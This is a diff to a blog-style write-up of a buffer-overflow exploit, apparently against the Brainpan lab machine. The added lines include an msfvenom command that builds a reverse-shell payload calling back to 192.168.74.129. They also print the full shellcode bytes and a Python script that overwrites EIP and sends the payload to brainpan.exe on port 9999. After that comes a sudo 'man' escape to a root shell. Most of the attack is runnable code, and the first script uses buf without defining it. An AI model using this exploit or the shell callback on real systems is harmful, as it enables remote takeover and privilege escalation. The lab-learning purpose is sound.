@@ -475,10 +475,19 @@ We use msfvenom to create the payload using the following command:
 <br/>
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.74.129 LPORT=444 EXITFUNC=thread -f python  -a x86 -b "\x00"
-```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.74.129 LPORT=4444 -f python -b "\x00"
 
-![placeholder](/assets/img/uploads/bufoverflow1/25.png "Large example image")
+buf =  b""
+buf += b"\xb8\xc2\xdd\x8f\x16\xdb\xc9\xd9\x74\x24\xf4\x5b\x33"
+buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x01\xd9\x6d"
+buf += b"\xe3\xb4\x39\x86\xef\xe5\xfe\x3a\x9a\x0b\x88\x5c\xea"
+buf += b"\x6d\x47\x1e\x98\x28\xe7\x20\x52\x4a\x4e\x26\x95\x22"
+buf += b"\x91\x70\x2f\x33\x79\x83\xb0\x22\x26\x0a\x51\xf4\xb0"
+buf += b"\x5c\xc3\xa7\x8f\x5e\x6a\xa6\x3d\xe0\x3e\x40\xd0\xce"
+buf += b"\xcd\xf8\x44\x3e\x1d\x9a\xfd\xc9\x82\x08\xad\x40\xa5"
+buf += b"\x1c\x5a\x9e\xa6"
+
+```
 
 
 We need to adapt the previous python code to add the payload instead the "C" strings:
@@ -492,14 +501,25 @@ import sys
 
 size = 524
 eip = "\xf3\x12\x17\x31"
-shell = 400
+nullops= "\x90"*10
+
+buf += b"\xb8\xc2\xdd\x8f\x16\xdb\xc9\xd9\x74\x24\xf4\x5b\x33"
+buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x01\xd9\x6d"
+buf += b"\xe3\xb4\x39\x86\xef\xe5\xfe\x3a\x9a\x0b\x88\x5c\xea"
+buf += b"\x6d\x47\x1e\x98\x28\xe7\x20\x52\x4a\x4e\x26\x95\x22"
+buf += b"\x91\x70\x2f\x33\x79\x83\xb0\x22\x26\x0a\x51\xf4\xb0"
+buf += b"\x5c\xc3\xa7\x8f\x5e\x6a\xa6\x3d\xe0\x3e\x40\xd0\xce"
+buf += b"\xcd\xf8\x44\x3e\x1d\x9a\xfd\xc9\x82\x08\xad\x40\xa5"
+buf += b"\x1c\x5a\x9e\xa6"
+
+
 ip = "192.168.74.131"
 port = 9999
 
 
 try:
-    print "\nInput buffer of %s bytes" % (size)
-    buffer = "A" * size + eip + "C" * shell
+    print "\nSending malicious input to %s" % (ip)
+    buffer = "A" * size + eip + nullops + buf
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -509,13 +529,12 @@ try:
     s.close()
     
     time.sleep(3)
+    
+    print "\nDONE !!!"
 
 except:
     print "\nService Crash !!!"
     sys.exit()
-
-
-    CHANGEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
 ```
 
 Start the service in the windows local machine and execute the python script:
@@ -547,14 +566,25 @@ import sys
 
 size = 524
 eip = "\xf3\x12\x17\x31"
-shell = 400
-ip = "192.168.74.131"
+nullops= "\x90"*10
+
+buf =  b""
+buf += b"\xb8\xc2\xdd\x8f\x16\xdb\xc9\xd9\x74\x24\xf4\x5b\x33"
+buf += b"\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x01\xd9\x6d"
+buf += b"\xe3\xb4\x39\x86\xef\xe5\xfe\x3a\x9a\x0b\x88\x5c\xea"
+buf += b"\x6d\x47\x1e\x98\x28\xe7\x20\x52\x4a\x4e\x26\x95\x22"
+buf += b"\x91\x70\x2f\x33\x79\x83\xb0\x22\x26\x0a\x51\xf4\xb0"
+buf += b"\x5c\xc3\xa7\x8f\x5e\x6a\xa6\x3d\xe0\x3e\x40\xd0\xce"
+buf += b"\xcd\xf8\x44\x3e\x1d\x9a\xfd\xc9\x82\x08\xad\x40\xa5"
+buf += b"\x1c\x5a\x9e\xa6"
+
+ip = "192.168.74.130"
 port = 9999
 
 
 try:
-    print "\nInput buffer of %s bytes" % (size)
-    buffer = "A" * size + eip + "C" * shell
+    print "\nSending malicious input to %s" % (ip)
+    buffer = "A" * size + eip + nullops + buf
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -564,13 +594,13 @@ try:
     s.close()
     
     time.sleep(3)
+    
+    print "\nDONE !!!"
 
 except:
     print "\nService Crash !!!"
     sys.exit()
 
-
-    CHANGEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
 ```
 
 The remote IP was 192.168.74.130 and has a remote service of brainpan.exe in PORT 9999. Executing the script with the remote IP:
@@ -587,9 +617,25 @@ And obtain a reverse shell in the attacker machine:
 
 <br/>
 
+After obtain a reverse shell terminal, we need to do the following:
+
+![placeholder](/assets/img/uploads/bufoverflow1/31.png "Large example image")
 
 
+We search the binaries that the actual user "puck" would use as root.
 
+> And found anansi_util binary
+
+Running it as sudo, see various options:
+
+![placeholder](/assets/img/uploads/bufoverflow1/32.png "Large example image")
+
+
+Using the manual option with the command "man" throws a warning message, and the input can be exploited by using ! to execute a command. In my case, we spawn a bash shell:
+
+![placeholder](/assets/img/uploads/bufoverflow1/33.png "Large example image")
+
+> We have got a ROOT Shell.
 
 <br/>
 <br/>
